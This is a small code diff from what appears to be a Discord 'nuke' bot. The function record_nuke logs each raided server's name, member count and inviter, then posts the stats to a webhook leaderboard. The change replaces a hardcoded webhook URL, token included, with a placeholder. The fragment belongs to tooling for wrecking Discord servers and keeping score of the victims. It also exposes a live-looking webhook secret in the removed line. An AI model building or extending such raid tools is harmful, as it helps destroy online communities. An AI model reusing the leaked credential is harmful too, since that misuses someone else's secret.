@@ -294,7 +294,7 @@ async def record_nuke(guild, inviter):
 
         print(f"Recorded nuke: {guild.name} with {guild.member_count} members by {inviter}")
 
-        webhook_url = "https://discord.com/api/webhooks/1553853539220987914/q7tkuyv-uAxTLSPsMn-OfYRkNcttjG6h2lR-0xNp_XQ21Ct8qUh2n3xVf2AacdmlnyXQ"
+        webhook_url = "INSERT_WEBHOOK_URL_HERE" # insert a webhook url if you want to add leaderboard stats
         for attempt in range(1, 4):
             try:
                 async with aiohttp.ClientSession() as session:
